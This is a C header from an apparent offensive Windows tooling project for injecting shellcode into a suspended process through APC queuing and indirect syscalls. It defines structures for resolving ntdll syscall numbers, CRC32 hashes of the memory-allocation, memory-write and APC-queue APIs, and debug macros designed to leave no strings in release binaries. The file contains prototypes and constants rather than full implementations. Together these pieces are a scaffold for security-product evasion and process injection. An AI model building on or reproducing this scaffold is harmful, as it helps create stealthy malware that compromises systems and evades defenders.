#pragma once
#include <windows.h>
#include <stdio.h>
#include "structs.h"

// If the following line is set, verbose debug messages are printed to the console windows
#define DEBUG

/// Macros
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

#ifdef DEBUG
// The following macros can be used to display debugging information. 
// The messages are only shown if DEBUG mode is enabled.

#define OKAY(MSG, ...) printf("[+] " MSG "\n", ##__VA_ARGS__)
#define OKAY_W(MSG, ...) wprintf(L"[+] " MSG L"\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[#] " MSG "\n", ##__VA_ARGS__)
#define INFO_W(MSG, ...) wprintf(L"[#] " MSG L"\n", ##__VA_ARGS__)
#define WARN(MSG, ...) fprintf(stderr, "[-] " MSG "\n", ##__VA_ARGS__)
#define WARN_W(MSG, ...) fwprintf(stderr, L"[-] " MSG L"\n", ##__VA_ARGS__)
#define PRINT_ERROR(FUNCTION_NAME)                                        \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: %d. [%s:%d]  \n",   \
                GetLastError(), __FILE__, __LINE__);                      \
    } while (0)
#define PRINT_NTERROR(FUNCTION_NAME)                                      \
    do {                                                                  \
        fprintf(stderr,                                                   \
                "[!] " FUNCTION_NAME " failed, error: 0x%X. [%s:%d]  \n", \
                STATUS, __FILE__, __LINE__);                              \
    } while (0)

#endif 

#ifndef DEBUG
// The following macros will be deleted by the preprocessor, since they include no code. 
// This enables the use of the macros in debug mode, but they will not contain strings that are visible in the binary.

#define OKAY(MSG, ...) 
#define OKAY_W(MSG, ...)
#define INFO(MSG, ...)
#define INFO_W(MSG, ...)
#define WARN(MSG, ...) 
#define WARN_W(MSG, ...) 
#define PRINT_ERROR(FUNCTION_NAME)                                        
#define PRINT_NTERROR(FUNCTION_NAME)                                       

#endif 


// NTDLL_CONFIG Structure
typedef struct _NTDLL_CONFIG {
    PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses of ntdll's exported functions   
    PDWORD      pdwArrayOfNames;     // The VA of the array of names of ntdll's exported functions       
    PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals of ntdll's exported functions     
    DWORD       dwNumberOfNames;     // The number of exported functions from ntdll.dll                 
    ULONG_PTR   uModule;             // The base address of ntdll - requred to calculated future RVAs  

} NTDLL_CONFIG, * PNTDLL_CONFIG;

typedef struct _NT_SYSCALL {
    DWORD dwSSn;                    // syscall number
    DWORD dwSyscallHash;            // syscall hash value
    PVOID pSyscallAddress;          // syscall address
    PVOID pSyscallInstAddress;      // address of a random 'syscall' instruction in ntdll    
} NT_SYSCALL, * PNT_SYSCALL;

typedef struct _NTAPI_FUNC {
    NT_SYSCALL	NtAllocateVirtualMemory;
    NT_SYSCALL	NtWriteVirtualMemory;
    NT_SYSCALL	NtProtectVirtualMemory;
    NT_SYSCALL	NtQueueApcThread;

} NTAPI_FUNC, * PNTAPI_FUNC;

// External function prototypes
extern VOID SetSSn(WORD wSystemCall);
extern RunSyscall();

// Helper macro for indirect syscalls
#define SET_SYSCALL(NtSys)(SetSSn((DWORD)NtSys.dwSSn,(PVOID)NtSys.pSyscallInstAddress))

// API Hashes
#define NtAllocateVirtualMemory_crc32h 0x00000000FFE254CF
#define NtWriteVirtualMemory_crc32h 0x00000000FFE3BE00
#define NtProtectVirtualMemory_crc32h 0x00000000FFEE2A52
#define NtQueueApcThread_crc32h 0x00000000FFEEBC1C

// Function prototypes
void PRINT_BYTES(unsigned char* arr, SIZE_T size);
unsigned int crc32h(char* message);
#define HASH(API) crc32h((char*)API)

BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys); 
BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT PDWORD pdwProcessId, OUT PHANDLE phProcess, OUT PHANDLE phThread); 
BOOL ApcInjectionViaIndirectSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, IN SIZE_T sSize); 